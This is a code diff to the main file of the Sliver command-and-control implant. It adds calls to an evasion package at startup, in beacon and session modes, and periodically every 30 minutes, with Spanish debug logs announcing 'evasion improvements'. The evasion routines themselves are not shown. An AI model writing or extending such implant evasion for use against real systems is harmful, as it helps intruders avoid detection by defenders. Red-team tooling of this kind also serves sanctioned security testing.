@@ -42,6 +42,7 @@ import (
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	"github.com/bishopfox/sliver/implant/sliver/evasion"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
@@ -145,6 +146,37 @@ func main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
+	// {{if .Config.Debug}}
+	log.Println("=== SLIVER v1.6.0 CON MEJORAS DE EVASIÓN ===")
+	// {{end}}
+
+	// Initialize enhanced evasion capabilities
+	evasionConfig := evasion.InitializeEnhancedEvasion()
+
+	// {{if .Config.Debug}}
+	log.Printf("Configuración de evasión inicializada")
+	// {{end}}
+
+	// Perform initial evasion before any network activity
+	err := evasion.PerformInitialEvasion(evasionConfig)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Advertencia: Evasión inicial falló: %v", err)
+		// {{end}}
+
+		// Try quick evasion as fallback
+		err = evasion.QuickEvasion()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Evasión rápida también falló: %v", err)
+			// {{end}}
+		}
+	}
+
+	// {{if .Config.Debug}}
+	log.Println("Evasión inicial completada")
+	// {{end}}
+
 	// {{if .Config.IsService}}
 	svc.Run("", &sliverService{})
 	// {{else}}
@@ -162,11 +194,49 @@ func main() {
 func beaconStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
+	log.Println("Iniciando modo beacon con evasión mejorada")
 	// {{end}}
+
+	// Perform beacon-specific evasion
+	config := evasion.GetRecommendedEvasionConfig()
+	config.DelayBetweenOps = 25 // Faster operations for beacon
+	config.RandomizeOrder = true
+
+	err := evasion.PerformInitialEvasion(config)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Evasión para beacon falló: %v", err)
+		// {{end}}
+	}
+
 	abort := make(chan struct{})
 	defer func() {
 		abort <- struct{}{}
 	}()
+
+	// Setup periodic evasion maintenance (every 30 minutes)
+	maintenanceTicker := time.NewTicker(30 * time.Minute)
+	defer maintenanceTicker.Stop()
+
+	go func() {
+		for {
+			select {
+			case <-maintenanceTicker.C:
+				// {{if .Config.Debug}}
+				log.Println("Realizando mantenimiento periódico de evasión")
+				// {{end}}
+				err := evasion.PerformPeriodicEvasion(config)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("Mantenimiento de evasión falló: %v", err)
+					// {{end}}
+				}
+			case <-abort:
+				return
+			}
+		}
+	}()
+
 	beacons := transports.StartBeaconLoop(abort)
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
@@ -194,7 +264,19 @@ func beaconStartup() {
 func sessionStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
+	log.Println("Iniciando modo sesión con evasión mejorada")
 	// {{end}}
+
+	// For sessions, use more conservative evasion
+	config := evasion.InitializeEnhancedEvasion()
+	config.DelayBetweenOps = 200 // Slower for persistent sessions
+
+	err := evasion.PerformInitialEvasion(config)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Evasión para sesión falló: %v", err)
+		// {{end}}
+	}
 	abort := make(chan struct{})
 	defer func() {
 		abort <- struct{}{}
